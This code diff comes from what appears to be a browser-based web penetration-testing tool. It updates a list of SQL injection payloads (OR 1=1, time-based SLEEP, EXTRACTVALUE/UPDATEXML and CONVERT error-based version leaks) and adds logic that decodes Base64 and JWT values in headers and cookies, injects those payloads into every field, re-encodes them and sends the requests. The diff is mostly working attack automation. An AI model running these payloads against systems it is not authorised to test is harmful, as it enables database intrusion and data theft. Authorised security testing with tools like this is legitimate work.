@@ -483,15 +483,7 @@ document.getElementById("injectPage")?.addEventListener("click", async () => {
         }
 
         if (sum) sum.textContent = `${typeof t === "function" ? t("resp.summary") : "Page Response"} (${method} ${resp.status}) – ${text.length} Bytes · ${ms} ms`;
-        if (typeof toastRequest === "function") {
-            toastRequest(method, resp.status, text.length, ms, currentUrl);
-        } else {
-            log((typeof t === "function" ? t("log.openResult") : "Open →") + ` ${method} ${resp.status}`, "success", {
-                detail: text.length + " B · " + ms + " ms",
-                preview: currentUrl
-            });
-        }
-        log((typeof t === "function" ? t("log.openResult") : "Open →") + ` ${method} ${resp.status} (${text.length} B, ${ms} ms)`);
+        
     } catch (err) {
         if (tr) tr.innerHTML = `<span class="tok-err">${typeof t === "function" ? t("resp.error") : "Error"}: ${escapeHtml(String(err.message || err))}</span>`;
         if (sum) sum.textContent = (typeof t === "function" ? t("resp.summary") : "Page Response") + " – " + (typeof t === "function" ? t("resp.error") : "Error");
@@ -752,11 +744,11 @@ updateEncodeButtons();
 
     const HEADER_DETECTION_PAYLOADS = [
         { name: "Single Quote", payload: "'" },
-        { name: "OR 1=1", payload: "' OR 1=1--" },
-        { name: "AND SLEEP(5)", payload: "' AND SLEEP(5)--" },
-        { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
-        { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
-        { name: "CONVERT MSSQL", payload: "' AND 1=CONVERT(int,@@version)--" },
+        { name: "OR 1=1", payload: "' OR 1=1-- -" },
+        { name: "AND SLEEP(5)", payload: "' AND SLEEP(5)-- -" },
+        { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -" },
+        { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -" },
+        { name: "CONVERT MSSQL", payload: "' AND 1=CONVERT(int,@@version)-- -" },
     ];
 
     let hdrTestAbort = false;
@@ -802,10 +794,128 @@ updateEncodeButtons();
         return result;
     }
 
+    // ---- Smart Base64 / JWT payload injection for header values ----
+    function looksLikeBase64(s) {
+        if (!s || typeof s !== "string" || s.length < 8) return false;
+        // standard Base64 or Base64URL, optional padding
+        return /^[A-Za-z0-9+/_-]+={0,2}$/.test(s) && (s.length % 4 !== 1);
+    }
+
+    function b64Decode(str) {
+        // tolerate Base64URL
+        let s = String(str).replace(/-/g, "+").replace(/_/g, "/");
+        while (s.length % 4) s += "=";
+        return atob(s);
+    }
+
+    function b64Encode(str, urlSafe) {
+        let out = btoa(unescape(encodeURIComponent(str)));
+        if (urlSafe) {
+            out = out.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+        }
+        return out;
+    }
+
+    function injectLeavesLocal(obj, payload) {
+        if (obj === null || obj === undefined) return obj;
+        if (typeof obj !== "object") return obj;
+        if (Array.isArray(obj)) {
+            for (let i = 0; i < obj.length; i++) {
+                if (obj[i] !== null && typeof obj[i] === "object") injectLeavesLocal(obj[i], payload);
+                else if (typeof obj[i] === "string" || typeof obj[i] === "number") {
+                    obj[i] = String(obj[i]) + String(payload);
+                }
+            }
+            return obj;
+        }
+        Object.keys(obj).forEach((k) => {
+            const v = obj[k];
+            if (v !== null && typeof v === "object") injectLeavesLocal(v, payload);
+            else if (typeof v === "string" || typeof v === "number") {
+                obj[k] = String(v) + String(payload);
+            }
+        });
+        return obj;
+    }
+
+    /**
+     * Inject payload into a header/cookie value.
+     * - JWT (2–3 segments): decode middle part, inject into JSON string leaves (or append to plain text), re-encode Base64URL, rebuild token.
+     * - Pure Base64: decode → inject (JSON leaves or append) → re-encode.
+     * - Otherwise: classic append.
+     * Returns { value, smart: boolean }
+     */
+    function injectPayloadIntoHeaderValue(originalValue, payload) {
+        const val = originalValue == null ? "" : String(originalValue);
+        const p = String(payload || "");
+
+        // 1) JWT-style: header.payload[.sig]
+        const parts = val.split(".");
+        if (parts.length === 2 || parts.length === 3) {
+            try {
+                const mid = parts[1];
+                if (looksLikeBase64(mid) || mid.length >= 4) {
+                    const decoded = b64Decode(mid);
+                    let newMid;
+                    try {
+                        const obj = JSON.parse(decoded);
+                        const clone = JSON.parse(JSON.stringify(obj));
+                        if (typeof injectAllLeaves === "function") {
+                            injectAllLeaves(clone, p);
+                        } else {
+                            injectLeavesLocal(clone, p);
+                        }
+                        newMid = b64Encode(JSON.stringify(clone), true);
+                    } catch (_) {
+                        // not JSON → append to decoded text
+                        newMid = b64Encode(decoded + p, true);
+                    }
+                    parts[1] = newMid;
+                    return { value: parts.join("."), smart: true };
+                }
+            } catch (_) { /* fall through */ }
+        }
+
+        // 2) Pure Base64 / Base64URL
+        if (looksLikeBase64(val)) {
+            try {
+                const decoded = b64Decode(val);
+                let encoded;
+                try {
+                    const obj = JSON.parse(decoded);
+                    const clone = JSON.parse(JSON.stringify(obj));
+                    if (typeof injectAllLeaves === "function") {
+                        injectAllLeaves(clone, p);
+                    } else {
+                        injectLeavesLocal(clone, p);
+                    }
+                    // keep original style (url-safe if original used -_)
+                    const urlSafe = /[-_]/.test(val);
+                    encoded = b64Encode(JSON.stringify(clone), urlSafe);
+                } catch (_) {
+                    const urlSafe = /[-_]/.test(val);
+                    encoded = b64Encode(decoded + p, urlSafe);
+                }
+                return { value: encoded, smart: true };
+            } catch (_) { /* fall through */ }
+        }
+
+        // 3) Classic append
+        return { value: val + p, smart: false };
+    }
+
     async function testSingleHeader(header, payload, baseUrl, method, bodyText, baseHeaders, sendCookies) {
         const testHeaders = { ...baseHeaders };
 
+        let injectedValue = null;
+        let usedSmart = false;
+
         if (header.isCookiePart) {
+            const origVal = header.originalValue || "";
+            const inj = injectPayloadIntoHeaderValue(origVal, payload);
+            injectedValue = inj.value;
+            usedSmart = inj.smart;
+
             const cookieParts = [];
             const existing = (baseHeaders["Cookie"] || baseHeaders["cookie"] || "").split(";");
             let found = false;
@@ -815,18 +925,22 @@ updateEncodeButtons();
                 const eq = t.indexOf("=");
                 const n = eq >= 0 ? t.slice(0, eq).trim() : t;
                 if (n.toLowerCase() === header.cookieName.toLowerCase()) {
-                    cookieParts.push(header.cookieName + "=" + (header.originalValue || "") + payload);
+                    cookieParts.push(header.cookieName + "=" + injectedValue);
                     found = true;
                 } else {
                     cookieParts.push(t);
                 }
             });
             if (!found) {
-                cookieParts.push(header.cookieName + "=" + (header.originalValue || "") + payload);
+                cookieParts.push(header.cookieName + "=" + injectedValue);
             }
             testHeaders["Cookie"] = cookieParts.join("; ");
         } else {
-            testHeaders[header.name] = (header.value || "") + payload;
+            const origVal = header.value || "";
+            const inj = injectPayloadIntoHeaderValue(origVal, payload);
+            injectedValue = inj.value;
+            usedSmart = inj.smart;
+            testHeaders[header.name] = injectedValue;
         }
 
         const start = performance.now();
@@ -855,6 +969,8 @@ updateEncodeButtons();
         return {
             header,
             payload,
+            injectedValue,
+            smartInject: usedSmart,
             ok: resp.ok,
             status: resp.status,
             body: resp.body || "",
@@ -894,7 +1010,8 @@ updateEncodeButtons();
             const name = r.header.isCookiePart
                 ? `Cookie:${r.header.cookieName}`
                 : r.header.name;
-            const label = `${name} + ${r.payload.substring(0, 28)}${r.payload.length > 28 ? "…" : ""}`;
+            const smartTag = r.smartInject ? " [b64]" : "";
+            const label = `${name}${smartTag} + ${r.payload.substring(0, 28)}${r.payload.length > 28 ? "…" : ""}`;
 
             let color = "#888";
             let badge = "clean";
@@ -926,6 +1043,13 @@ updateEncodeButtons();
                 const r = results[parseInt(btn.dataset.idx, 10)];
                 if (!r) return;
 
+                // Prefer the actual value that was sent (smart b64/JWT inject or classic append)
+                const finalVal = (r.injectedValue != null)
+                    ? r.injectedValue
+                    : (r.header.isCookiePart
+                        ? (r.header.originalValue || "") + r.payload
+                        : (r.header.value || "") + r.payload);
+
                 const th = document.getElementById("testerHeaders");
                 if (th) {
                     const lines = th.value.split("\n").map(l => l.trim()).filter(Boolean);
@@ -937,14 +1061,18 @@ updateEncodeButtons();
                         if (n.toLowerCase() === r.header.name.toLowerCase()) {
                             found = true;
                             if (r.header.isCookiePart) {
-                                return "Cookie: " + r.header.cookieName + "=" + (r.header.originalValue || "") + r.payload;
+                                return "Cookie: " + r.header.cookieName + "=" + finalVal;
                             }
-                            return r.header.name + ": " + (r.header.value || "") + r.payload;
+                            return r.header.name + ": " + finalVal;
                         }
                         return line;
                     });
                     if (!found) {
-                        newLines.push(r.header.name + ": " + (r.header.value || "") + r.payload);
+                        if (r.header.isCookiePart) {
+                            newLines.push("Cookie: " + r.header.cookieName + "=" + finalVal);
+                        } else {
+                            newLines.push(r.header.name + ": " + finalVal);
+                        }
                     }
                     th.value = newLines.join("\n");
                 }
@@ -958,7 +1086,8 @@ updateEncodeButtons();
                 if (typeof analyzeSqliResponse === "function") {
                     analyzeSqliResponse(r.body || "", r.status, (r.body || "").length, r.ms);
                 }
-                log((typeof t === "function" ? t("hdrtest.loaded") : "Header-Test geladen:") + " " + r.header.name);
+                log((typeof t === "function" ? t("hdrtest.loaded") : "Header-Test geladen:") + " " + r.header.name +
+                    (r.smartInject ? " (smart b64/JWT)" : ""));
             });
         });
     }
